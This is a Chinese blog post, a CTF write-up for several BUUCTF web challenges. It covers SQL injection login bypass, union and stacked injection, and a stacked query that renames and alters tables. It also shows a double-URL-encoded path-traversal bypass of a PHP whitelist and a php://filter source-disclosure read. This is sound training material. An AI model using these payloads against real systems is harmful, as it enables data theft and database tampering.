@@ -1,0 +1,675 @@
+<!DOCTYPE html><html class="hide-aside" lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>BUU_Web_page1 | Kanyun's Blog</title><meta name="keywords" content="CTF_WEB"><meta name="author" content="kanyun"><meta name="copyright" content="kanyun"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="1、[极客大挑2019]EasySQL1看到SQL就想到先尝试万能密码  1’ or 1&#x3D;1# 解释：’是为了形成闭合语句，#为注释符(后面语句不再执行) 需要注意的是: 1.#可能会被URL自动进行编码导致语句错误 2.空格被过滤可以使用&#x2F;**&#x2F;绕过 解决：%23为#注释符的url编码 语句相当于：  select * from table_name where username&#x3D;&amp;#">
+<meta property="og:type" content="article">
+<meta property="og:title" content="BUU_Web_page1">
+<meta property="og:url" content="http://kannikanyun.github.io/2022/05/12/BUU-Web-page1/index.html">
+<meta property="og:site_name" content="Kanyun&#39;s Blog">
+<meta property="og:description" content="1、[极客大挑2019]EasySQL1看到SQL就想到先尝试万能密码  1’ or 1&#x3D;1# 解释：’是为了形成闭合语句，#为注释符(后面语句不再执行) 需要注意的是: 1.#可能会被URL自动进行编码导致语句错误 2.空格被过滤可以使用&#x2F;**&#x2F;绕过 解决：%23为#注释符的url编码 语句相当于：  select * from table_name where username&#x3D;&amp;#">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202204031731155.jpg">
+<meta property="article:published_time" content="2022-05-12T14:07:34.000Z">
+<meta property="article:modified_time" content="2022-05-12T14:08:44.473Z">
+<meta property="article:author" content="kanyun">
+<meta property="article:tag" content="CTF_WEB">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202204031731155.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://kannikanyun.github.io/2022/05/12/BUU-Web-page1/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta/><meta/><meta/><meta/><meta/><meta/><meta/><meta/><meta/><meta/><meta/><meta/><meta/><meta/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"search.xml","languages":{"hits_empty":"找不到您查询的内容：${query}"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'mediumZoom',
+  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#49b1f5","bgDark":"#121212","position":"top-right"},
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: true,
+  isAnchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'BUU_Web_page1',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2022-05-12 22:08:44'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><link rel="stylesheet" href="/css/myWordCss.css"><link rel="stylesheet" href="/css/mycss.css"><meta name="generator" content="Hexo 6.0.0"><link rel="alternate" href="/atom.xml" title="Kanyun's Blog" type="application/atom+xml">
+</head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src= "/%E7%B4%AF%E4%BA%86%E6%AD%87%E4%B8%80%E4%BC%9A%20%E7%AD%89%E7%AD%89%E6%88%91" data-lazy-src="/photo/%E5%A4%B4%E5%83%8F.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data is-center"><div class="data-item"><a href="/archives/"><div class="headline">文章</div><div class="length-num">19</div></a></div><div class="data-item"><a href="/tags/"><div class="headline">标签</div><div class="length-num">6</div></a></div><div class="data-item"><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-heartbeat"></i><span> 清单</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/Gallery/"><i class="fa-fw fas fa-images"></i><span> 照片</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li><li><a class="site-page child" href="/diary/"><i class="fa-fw fas fa-diary"></i><span> 笔记</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202204031731155.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Kanyun's Blog</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-heartbeat"></i><span> 清单</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/Gallery/"><i class="fa-fw fas fa-images"></i><span> 照片</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li><li><a class="site-page child" href="/diary/"><i class="fa-fw fas fa-diary"></i><span> 笔记</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">BUU_Web_page1</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-05-12T14:07:34.000Z" title="发表于 2022-05-12 22:07:34">2022-05-12</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-05-12T14:08:44.473Z" title="更新于 2022-05-12 22:08:44">2022-05-12</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">3.7k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>14分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="BUU_Web_page1"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="1、-极客大挑2019-EasySQL1"><a href="#1、-极客大挑2019-EasySQL1" class="headerlink" title="1、[极客大挑2019]EasySQL1"></a>1、[极客大挑2019]EasySQL1</h1><p>看到SQL就想到先尝试万能密码</p>
+<blockquote>
+<p>1’ or 1=1#</p>
+<p>解释：’是为了形成闭合语句，#为注释符(后面语句不再执行)</p>
+<p>需要注意的是:</p>
+<p>1.#可能会被URL自动进行编码导致语句错误</p>
+<p>2.空格被过滤可以使用<code>/**/</code>绕过</p>
+<p><em><u>解决：%23为#注释符的url编码</u></em></p>
+<p>语句相当于：</p>
+</blockquote>
+<pre class="line-numbers language-none"><code class="language-none">select * from table_name where username&#x3D;&#39;1&#39; or 1&#x3D;1 # &#39; and password&#x3D;&#39;xxxxxx&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h2 id="2-其实应该先简单判断是否存在注入点的"><a href="#2-其实应该先简单判断是否存在注入点的" class="headerlink" title="2.其实应该先简单判断是否存在注入点的"></a>2.其实应该先简单判断是否存在注入点的</h2><p>　如果页面返回错误，则存在 Sql 注入。 原因是无论字符型还是整型都会因为</p>
+<blockquote>
+<p><strong>单引号个数不匹配</strong></p>
+</blockquote>
+<p>而报错。</p>
+<h2 id="3第三步、利用order-by查表的列数"><a href="#3第三步、利用order-by查表的列数" class="headerlink" title="3第三步、利用order by查表的列数"></a>3<em><strong>第三步、利用order by查表的列数</strong></em></h2><p><code>payload：username=1&#39; order by 3%23&amp;password=123（NO,Wrong username password！！！）</code><br><code>payload：username=1&#39; order by 4%23&amp;password=123（Unknown column &#39;4&#39; in &#39;order clause&#39;）</code><br><code>说明表只有三列</code></p>
+<h4 id="4-第四步、如有回显，找到回显位（回显，就是显示正在执行的批处理命令及执行的结果等）"><a href="#4-第四步、如有回显，找到回显位（回显，就是显示正在执行的批处理命令及执行的结果等）" class="headerlink" title="4.第四步、如有回显，找到回显位（回显，就是显示正在执行的批处理命令及执行的结果等）"></a>4.<em><strong>第四步、如有回显，找到回显位（回显，就是显示正在执行的批处理命令及执行的结果等）</strong></em></h4><blockquote>
+<p>payload：username=1’ union select 1,2,3%23&amp;password=123</p>
+</blockquote>
+<h2 id="法二：两处判断都绕过"><a href="#法二：两处判断都绕过" class="headerlink" title="法二：两处判断都绕过"></a>法二：两处判断都绕过</h2><p>使用两次<code>&#39;or 1=1#</code></p>
+<p><code>?username=1&#39;or 1=1%23&amp;password=1&#39; or 1=1%23</code></p>
+<p>[(70条消息) CTF-BUUCTF-<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_42404383/article/details/103688509?ops_request_misc=%7B%22request_id%22:%22165054871516780264049295%22,%22scm%22:%2220140713.130102334.pc_all.%22%7D&request_id=165054871516780264049295&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-1-103688509.142%5Ev9%5Epc_search_result_cache,157%5Ev4%5Enew_style&utm_term=%5BHCTF+2018%5DWarmUp+1&spm=1018.2226.3001.4187">HCTF 2018]WarmUp_黑仔丶的博客-CSDN博客_buuctf的warmup题</a></p>
+<h1 id="2、-HCTF-2018-WarmUp"><a href="#2、-HCTF-2018-WarmUp" class="headerlink" title="2、[HCTF 2018]WarmUp"></a>2、[HCTF 2018]WarmUp</h1><blockquote>
+<p>F12提示source.php</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+ <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+ <span class="token keyword">class</span> <span class="token class-name-definition class-name">emmm</span>
+ <span class="token punctuation">&#123;</span>
+     <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">function</span> <span class="token function-definition function">checkFile</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$page</span><span class="token punctuation">)</span> 
+     <span class="token comment">//传入了变量page，也就是我们刚刚传进来的file</span>
+     <span class="token punctuation">&#123;</span>
+     	<span class="token comment">// 这里定义了白名单</span>
+         <span class="token variable">$whitelist</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string double-quoted-string">"source"</span><span class="token operator">=></span><span class="token string double-quoted-string">"source.php"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"hint"</span><span class="token operator">=></span><span class="token string double-quoted-string">"hint.php"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+         <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+         <span class="token comment">/*为了返回 true 两个条件必须满足
+         	1 page存在 
+         	2 page是字符串 ，
+         	这里和外层的判断file 一致基本是再次判断了一遍*/</span>
+             <span class="token keyword">echo</span> <span class="token string double-quoted-string">"you can't see it"</span><span class="token punctuation">;</span>
+             <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>
+         <span class="token punctuation">&#125;</span>
+         <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">,</span> <span class="token variable">$whitelist</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+             <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>
+         <span class="token punctuation">&#125;</span>
+			<span class="token comment">/*in_array(search,array,type) 函数搜索数组中是否存在指定的值，
+			白名单过滤，需要返回了ture
+			所以这里我们传入的page或者是经过截断之后的page必须是soure.php或hint.php，
+			这里是正常的访问，我们需要构造文件任意包含，所以这里传入的不满足条件，这里不是注意的点，往下继续看*/</span>
+         <span class="token variable">$_page</span> <span class="token operator">=</span> <span class="token function">mb_substr</span><span class="token punctuation">(</span> 
+             <span class="token variable">$page</span><span class="token punctuation">,</span>
+             <span class="token number">0</span><span class="token punctuation">,</span>
+             <span class="token function">mb_strpos</span><span class="token punctuation">(</span><span class="token variable">$page</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'?'</span><span class="token punctuation">,</span>  <span class="token string single-quoted-string">'?'</span><span class="token punctuation">)</span>
+         <span class="token punctuation">)</span><span class="token punctuation">;</span>
+			<span class="token comment">/*这里mb_sustr 是个截断，返回0到mb_strpos之间的内容，而mb_strps 则是查找第一次出现的位置，所以基本可以理解为获取page 两个？之间的字符串，也就是获取file两个？之间的字符串，放到url中就是http://ip/?file=ddd?中的file=ddd*/</span>            
+         <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$_page</span><span class="token punctuation">,</span> <span class="token variable">$whitelist</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> 
+             <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>
+         <span class="token punctuation">&#125;</span>
+         <span class="token comment">//这里和上面类似 查看_page 是否在白名单中</span>
+         <span class="token variable">$_page</span> <span class="token operator">=</span> <span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 这里发现对_page进行了一次decode解码，</span>
+         <span class="token variable">$_page</span> <span class="token operator">=</span> <span class="token function">mb_substr</span><span class="token punctuation">(</span><span class="token comment">//获取两个？？之间的内容</span>
+             <span class="token variable">$_page</span><span class="token punctuation">,</span>
+             <span class="token number">0</span><span class="token punctuation">,</span>
+             <span class="token function">mb_strpos</span><span class="token punctuation">(</span><span class="token variable">$_page</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'?'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'?'</span><span class="token punctuation">)</span>
+         <span class="token punctuation">)</span><span class="token punctuation">;</span>
+         <span class="token comment">// 这里是我们要绕过的点，从这里往上看 尝试构造</span>
+         <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$_page</span><span class="token punctuation">,</span> <span class="token variable">$whitelist</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//白名单</span>
+             <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>
+         <span class="token punctuation">&#125;</span>
+         <span class="token keyword">echo</span> <span class="token string double-quoted-string">"you can't see it"</span><span class="token punctuation">;</span>
+         <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>
+     <span class="token punctuation">&#125;</span>
+ <span class="token punctuation">&#125;</span>
+ <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span> <span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+     <span class="token operator">&amp;&amp;</span> <span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+     <span class="token operator">&amp;&amp;</span> <span class="token class-name static-context">emmm</span><span class="token operator">::</span><span class="token function">checkFile</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+ <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+     <span class="token keyword">include</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+     <span class="token keyword">exit</span><span class="token punctuation">;</span>
+ <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
+     <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>&lt;img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" />"</span><span class="token punctuation">;</span>
+ <span class="token punctuation">&#125;</span>
+	<span class="token operator">/</span><span class="token operator">*</span>必须满足<span class="token keyword">if</span>条件，才能包含file，这里也可以猜到可能考的是文件包含： 
+		<span class="token number">1</span> <span class="token constant">REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span>不为空 
+		<span class="token number">2</span> <span class="token constant">REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span>是字符串 
+		<span class="token number">3</span> <span class="token function">checkFile</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> 为ture，回到checkFile 函数分析如何返回<span class="token constant boolean">true</span><span class="token operator">*</span><span class="token operator">/</span>    
+<span class="token delimiter important">?></span></span>
+
+可以看到函数代码中有四个if语句
+第一个if语句对变量进行检验，要求$page为字符串，否则返回false
+第二个if语句判断$page是否存在于$whitelist数组中，存在则返回true
+第三个if语句判断截取后的$page是否存在于$whitelist数组中，截取$page中'?'前部分，存在则返回true
+第四个if语句判断url解码并截取后的$page是否存在于$whitelist中，存在则返回true
+若以上四个if语句均未返回值，则返回false
+有三个if语句可以返回true，第二个语句直接判断$page，不可用
+第三个语句截取'?'前部分，由于?被后部分被解析为get方式提交的参数，也不可利用
+第四个if语句中，先进行url解码再截取，因此我们可以将?经过两次url编码，在服务器端提取参数时解码一次，checkFile函数中解码一次，仍会解码为'?'，仍可通过第四个if语句校验。（'?'两次编码值为'%253f'）,构造url：
+所以我们的payload 就是
+file=source.php?file=source.php%253f../../../../../ffffllllaaaagggg
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+</blockquote>
+<h2 id="构造payload"><a href="#构造payload" class="headerlink" title="构造payload"></a>构造payload</h2><p><code>source.php?file=source.php%253f../../../../../ffffllllaaaagggg</code></p>
+<blockquote>
+<p>解释：</p>
+<p>1、PHP $_REQUEST</p>
+<p>PHP $_REQUEST 用于收集HTML表单提交的数据。</p>
+<p>2、?两次url编码后为：%253f</p>
+<p>3、../../../../../猜测：根据ffffllllaaaagggg有四层的原因</p>
+</blockquote>
+<p>3、[极客大挑战 2019]Havefun</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$cat</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cat'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+     <span class="token keyword">echo</span> <span class="token variable">$cat</span><span class="token punctuation">;</span>
+     <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$cat</span><span class="token operator">==</span><span class="token string single-quoted-string">'dog'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+         <span class="token keyword">echo</span> <span class="token string single-quoted-string">'Syc&#123;cat_cat_cat_cat&#125;'</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<blockquote>
+<p>payload:?cat=dog</p>
+<p>注意：不能写成?cat=’dog’（猜测可能被当做字符参数被解析）</p>
+</blockquote>
+<h1 id="3、-ACTF2020-新生赛-Include"><a href="#3、-ACTF2020-新生赛-Include" class="headerlink" title="3、[ACTF2020 新生赛]Include"></a>3、[ACTF2020 新生赛]Include</h1><blockquote>
+<p>只有：Can you find out the flag?</p>
+</blockquote>
+<p>源码也没有提示</p>
+<p>无思路了，查询</p>
+<p>主要思路：</p>
+<p><code>file=php://filter/read=convert.base64-encode/resource=flag.php</code></p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://www.php.cn/php-weizijiaocheng-387051.html">PHP中filter协议详解</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/destiny1507/article/details/82347371">php://filter 的使用</a></p>
+<p>读取源文件，并用base编码，绕过</p>
+<p>base64编码结果为：</p>
+<p><code>PD9waHAKZWNobyAiQ2FuIHlvdSBmaW5kIG91dCB0aGUgZmxhZz8iOwovL2ZsYWd7MzQ2NTQwYTAtMTI1MS00OGNmLTkyOWItODQ0NDVmMjc0ZTk4fQo=</code></p>
+<p>解码后为：</p>
+<p><code>&lt;?php echo &quot;Can you find out the flag?&quot;; //flag&#123;346540a0-1251-48cf-929b-84445f274e98&#125;</code></p>
+</blockquote>
+<p>可以看出：flag为注释内容，也就可以解释了，编码后可以看到完整源码</p>
+<h1 id="4、-强网杯-2019-随便注"><a href="#4、-强网杯-2019-随便注" class="headerlink" title="4、[强网杯 2019]随便注"></a>4、[强网杯 2019]随便注</h1><h2 id="sql堆叠注入知识"><a href="#sql堆叠注入知识" class="headerlink" title="sql堆叠注入知识"></a>sql堆叠注入知识</h2><p>堆叠注入原理：</p>
+<blockquote>
+<p>在SQL中，分号（;）是用来表示一条sql语句的结束。试想一下我们在 ; 结束一个sql语句后继续构造下一条语句，会不会一起执行？因此这个想法也就造就了堆叠注入。而union injection（联合注入）也是将两条语句合并在一起，两者之间有什么区别么？区别就在于union 或者union all执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。例如以下这个例子。用户输入：1; DELETE FROM products服务器端生成的sql语句为：（因未对输入的参数进行过滤）Select * from products where productid=1;DELETE FROM products当执行查询后，第一条显示查询信息，第二条则将整个表进行删除。</p>
+</blockquote>
+<h2 id="解题步骤"><a href="#解题步骤" class="headerlink" title="解题步骤"></a>解题步骤</h2><p><a target="_blank" rel="noopener" href="https://www.zhaoj.in/read-5873.html#0x04">解题具体步骤</a></p>
+<p>思路总结：</p>
+<blockquote>
+<p>1.先判断有无注入点<br><code>输入1，回显错误；</code></p>
+<p>`输入1#，正常回显；（说明存在sql注入）；</p>
+<p><code>输入1&#39; or &#39;1&#39;=&#39;1（不进行注释#，依旧回显正常，证明判断正确）</code></p>
+<p>2.判断字段<br><code>1&#39; order by 3 #（1、2均正确，3回显错误，说明有两个字段）《是不是说明了有两个回显位呢？》</code></p>
+<p>3.继续查询<br><code>1&#39; union select 1,2#</code>回显错误返回：<code>return preg_match(&quot;/select|update|delete|drop|insert|where|\./i&quot;,$inject);(正则匹配，过滤关键词)，到这里已经能看出来了：很多查询关键字都被过滤了，正常方法是查不到了</code></p>
+<p>4.(查询到了表和字段，但是默认查询表中并没有咱们想要的flag，因此，想要拿到flag必须让默认查询的表与字段和flag所在名匹配  )《此处也可以看出，人家给的第二个默认查询表words并不是没用的（需要知道它内部的名字）》<br>他既然没过滤 alert 和 rename，那么我们是不是可以把表改个名字，再给列改个名字呢</p>
+</blockquote>
+<h2 id="payload"><a href="#payload" class="headerlink" title="payload:"></a>payload:</h2><blockquote>
+<p><code>/?inject=1&#39;;RENAME TABLE </code>words<code>TO</code>words1<code>;RENAME TABLE </code>1919810931114514<code>TO</code>words<code>;ALTER TABLE </code>words<code>CHANGE</code>flag<code> </code>id<code> VARCHAR(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL;show columns from words;#</code></p>
+<p>改完后，默认查询id=1，就可以查到了</p>
+</blockquote>
